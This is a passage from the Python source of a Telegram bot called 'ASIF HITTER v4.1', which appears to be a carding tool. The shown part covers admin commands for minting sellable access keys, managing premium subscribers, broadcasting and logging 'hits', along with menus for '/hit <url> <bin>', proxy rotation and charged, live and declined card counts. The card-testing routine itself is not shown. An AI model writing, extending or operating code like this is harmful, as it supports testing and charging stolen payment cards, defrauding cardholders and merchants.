            while k in kd["keys"]: k=f"ASIF-{''.join(random.choices(chars,k=20))}"
            kd["keys"][k]={"hours":hours,"used":False,"used_by":None,"created":datetime.now().isoformat()}
            new.append(k)
        _sj(KEYS_FILE,kd); _rc()
        dur=f"{hours}h" if hours<24 else f"{hours//24}d"
        txt=f"{e('🎁')} <b>KEYS</b> ({count}x {dur})\n\n"+"\n".join([f"<code>{k}</code>" for k in new])
        if len(new)>15: await update.message.reply_document(InputFile(StringIO("\n".join(new)),filename="keys.txt"),caption=f"{count} keys ({dur})")
        else: await update.message.reply_text(txt,parse_mode=ParseMode.HTML)
    except Exception as ex: logger.error(f"genkey: {ex}")

async def cmd_premium_list(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not ia(update.effective_user.id): return
        pd=_lj(PREMIUM_FILE,{"users":{}}); users=pd.get("users",{})
        if not users:
            await update.message.reply_text(f"{e('❌')} No users",parse_mode=ParseMode.HTML)
            return
        txt=f"{e('👑')} <b>PREMIUM USERS ({len(users)})</b>\n\n"
        for uid,u in users.items():
            try:
                exp=datetime.fromisoformat(u.get("expiry","2000-01-01"))
                txt+=f"{e('🟢') if datetime.now()<exp else e('🔴')} <a href=\"tg://user?id={uid}\">{h(u.get('name','?'))}</a>\n   {e('⏱️')} {u.get('expiry','?')[:10]} | {e('💎')} {u.get('plan','?')}\n\n"
            except: pass
        await update.message.reply_text(txt[:4000],parse_mode=ParseMode.HTML)
    except Exception as ex: logger.error(f"premium: {ex}")

async def cmd_rmsub(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not ia(update.effective_user.id): return
        if not ctx.args:
            await update.message.reply_text(f"{e('⚠️')} /rmsub &lt;user_id&gt;",parse_mode=ParseMode.HTML)
            return
        uid=ctx.args[0]; pd=_lj(PREMIUM_FILE,{"users":{}})
        if uid in pd.get("users",{}):
            del pd["users"][uid]; _sj(PREMIUM_FILE,pd); _rc()
            await update.message.reply_text(f"{e('✅')} Removed",parse_mode=ParseMode.HTML)
        else: await update.message.reply_text(f"{e('❌')} Not found",parse_mode=ParseMode.HTML)
    except Exception as ex: logger.error(f"rmsub: {ex}")

async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not ia(update.effective_user.id): return
        msg=update.message.text.replace("/broadcast","",1).strip()
        if not msg:
            await update.message.reply_text(f"{e('⚠️')} /broadcast &lt;msg&gt;",parse_mode=ParseMode.HTML)
            return
        pd=_lj(PREMIUM_FILE,{"users":{}}); sent=0
        for uid in pd.get("users",{}):
            try:
                await ctx.bot.send_message(int(uid),f"{e('📢')} <b>BROADCAST</b>\n\n{msg}",parse_mode=ParseMode.HTML)
                sent+=1; await asyncio.sleep(0.2)
            except: pass
        await update.message.reply_text(f"{e('✅')} Sent: {sent}",parse_mode=ParseMode.HTML)
    except Exception as ex: logger.error(f"broadcast: {ex}")

async def cmd_sethits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not ia(update.effective_user.id): return
        if ctx.args:
            s=_lj(SETTINGS_FILE); s["log_channel"]=ctx.args[0]; _sj(SETTINGS_FILE,s); _rc()
            await update.message.reply_text(f"{e('✅')} Log: {h(ctx.args[0])}",parse_mode=ParseMode.HTML)
        else: await update.message.reply_text(f"{e('ℹ️')} /sethits @channel",parse_mode=ParseMode.HTML)
    except Exception as ex: logger.error(f"sethits: {ex}")

# ═══════════════════════════ CALLBACKS ═══════════════════════════
async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        q=update.callback_query; await q.answer(); d=q.data; uid=q.from_user.id
        if d=="gate_help": await q.message.reply_text(f"{e('🌐')} <b>Gateway</b>\n<code>/gate &lt;url&gt;</code>",parse_mode=ParseMode.HTML)
        elif d=="hit_help": await q.message.reply_text(f"{e('💳')} <b>Hit</b>\n<code>/hit &lt;url&gt; &lt;bin&gt;</code>",parse_mode=ParseMode.HTML)
        elif d=="redeem_help": await q.message.reply_text(f"{e('🔑')} <b>Redeem</b>\n<code>/redeem &lt;key&gt;</code>",parse_mode=ParseMode.HTML)
        elif d=="status": await cmd_status(update,ctx)
        elif d=="proxy_menu": await q.message.reply_text(f"{e('🔐')} <b>Proxy</b>\n/addproxy | /proxy | /rmproxy",parse_mode=ParseMode.HTML)
        elif d=="stats_view":
            stats=_lj(STATS_FILE,{"total_hits":0,"charged":0,"live":0,"declined":0})
            await q.message.reply_text(f"{e('📊')} <b>GLOBAL STATS</b>\n\n{e('🎯')} Hits: <b>{stats.get('total_hits',0)}</b>\n{e('🟢')} Charged: <b>{stats.get('charged',0)}</b>\n{e('🔵')} Live: <b>{stats.get('live',0)}</b>\n{e('🔴')} Declined: <b>{stats.get('declined',0)}</b>",parse_mode=ParseMode.HTML)
        elif d=="admin_panel" and ia(uid): await q.message.reply_text(f"{e('⚡')} <b>ADMIN</b>\n/genkey | /premium | /rmsub | /broadcast | /sethits",parse_mode=ParseMode.HTML)
    except Exception as ex: logger.error(f"callback: {ex}")

# ═══════════════════════════ MAIN ═══════════════════════════
def main():
    if BOT_TOKEN in ("YOUR_BOT_TOKEN_HERE",""):
        print("❌ BOT_TOKEN not set!"); sys.exit(1)
    os.makedirs(DATA_DIR,exist_ok=True); _rc()
    app=Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()
    app.add_error_handler(err_handler)
    app.add_handler(CommandHandler("start",cmd_start))
    app.add_handler(CommandHandler("gate",cmd_gate))
    app.add_handler(CommandHandler("hit",cmd_hit))
    app.add_handler(CommandHandler("addproxy",cmd_addproxy))
    app.add_handler(CommandHandler("proxy",cmd_proxy))
    app.add_handler(CommandHandler("rmproxy",cmd_rmproxy))
    app.add_handler(CommandHandler("redeem",cmd_redeem))
    app.add_handler(CommandHandler("auth",cmd_redeem))
    app.add_handler(CommandHandler("status",cmd_status))
    app.add_handler(CommandHandler("genkey",cmd_genkey))
    app.add_handler(CommandHandler("premium",cmd_premium_list))
    app.add_handler(CommandHandler("rmsub",cmd_rmsub))
    app.add_handler(CommandHandler("broadcast",cmd_broadcast))
    app.add_handler(CommandHandler("sethits",cmd_sethits))
    app.add_handler(CallbackQueryHandler(on_callback))
    print("✅ ASIF HITTER v4.1 RUNNING!")
    app.run_polling(allowed_updates=Update.ALL_TYPES,drop_pending_updates=True,close_loop=False)

if __name__=="__main__":
    main()
